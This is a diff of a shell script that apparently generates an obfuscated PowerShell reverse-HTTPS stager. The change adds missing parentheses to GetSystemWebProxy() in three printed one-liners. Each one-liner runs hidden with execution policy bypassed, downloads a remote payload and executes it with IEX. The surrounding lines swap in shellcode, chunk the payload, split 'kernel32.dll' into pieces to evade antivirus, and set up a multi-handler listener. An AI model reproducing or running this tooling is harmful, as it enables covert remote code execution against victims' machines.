@@ -27,7 +27,7 @@ $raw_payload
 
 # raw payload usage
 printf "Raw psh-net usage example:\n"
-printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"\$nwc=(New-Object Net.WebClient);\$nwc.Proxy=[Net.WebRequest]::GetSystemWebProxy;\$nwc.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/raw_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"
+printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"\$nwc=(New-Object Net.WebClient);\$nwc.Proxy=[Net.WebRequest]::GetSystemWebProxy();\$nwc.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/raw_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"
 
 # extract base64 encoded string, decode, convert to binary format for the future update
 # n00b dirty way: cat raw_pshnet_revhttps.ps1 | grep FromBase64String | grep -o '".*"' | sed 's/"//g'
@@ -55,7 +55,7 @@ printf "\nNew shellcode:\n$eleet_shellcode"
 #cp raw_pshnet_revhttps.ps1 eleet_pshnet_revhttps.ps1
 #sed -i "s,$raw_shellcode,$eleet_shellcode,g" eleet_pshnet_revhttps.ps1
 #printf "\nShellcode replacement done! eleet psh-net usage example:\n"
-#printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"\$nwc=(New-Object Net.WebClient);\$nwc.Proxy=[Net.WebRequest]::GetSystemWebProxy;\$nwc.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/eleet_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"
+#printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"\$nwc=(New-Object Net.WebClient);\$nwc.Proxy=[Net.WebRequest]::GetSystemWebProxy();\$nwc.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/eleet_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"
 
 # real eleet stager creations
 chunk_size=200
@@ -121,7 +121,7 @@ done
 sed -i 's,kernel32.dll,ke"+"rn"+"e"+"l"+"32."+"d"+"l"+"l,g' final_pshnet_revhttps.ps1
 
 printf "Final psh-net usage example:\n"
-printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"\$nwc=(New-Object Net.WebClient);\$nwc.Proxy=[Net.WebRequest]::GetSystemWebProxy;\$nwc.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/final_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"
+printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"\$nwc=(New-Object Net.WebClient);\$nwc.Proxy=[Net.WebRequest]::GetSystemWebProxy();\$nwc.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/final_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"
 
 # createing multu handler listener file
 printf "Creating multi handler script file...\n"
